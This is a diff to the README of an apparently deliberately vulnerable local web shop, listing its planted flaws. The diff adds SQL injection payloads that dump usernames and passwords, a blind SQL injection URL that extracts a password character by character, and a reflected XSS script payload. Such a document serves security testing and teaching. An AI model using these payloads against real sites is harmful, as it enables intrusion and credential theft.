@@ -8,17 +8,23 @@ $ jruby+truffle run -g --no-asserts -- app.rb
 Vulns
 -----
 
-Reflective XSS
-Order name
-
-Persistent XSS
-Product name and description
-
 SQL injection
 Search: ') UNION SELECT 0, 'Product SQLi', 'bla', 0 -- 
 http://localhost:4567/search?query='%29%20UNION%20SELECT%200,%20'Product SQLi',%20'bla',%200%20--%20
+Search: ') UNION SELECT id, CONCAT(username, ':', password), '', 0 FROM users -- 
+http://localhost:4567/search?query=%27%29+UNION+SELECT+id%2C+CONCAT%28username%2C+%27%3A%27%2C+password%29%2C+%27%27%2C+0+FROM+users+--+
 
 Blind SQL injection
 http://localhost:4567/product?id[]=0%29%20OR%20%281=1
+http://localhost:4567/product?id[]=0)%20OR%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20username%20=%20%27test%27),1,1)%20=%20%27t%27
+
+Reflective XSS
+Search field, Order name
+Search: "><script>alert(23);</script><br a="
+http://localhost:4567/search?query=%22%3E%3Cscript%3Ealert(23)%3B%3C%2Fscript%3E%3Cbr+a%3D%22
+
+Persistent XSS
+Username, Product name and description
 
 CC data leak on payment processing error
+
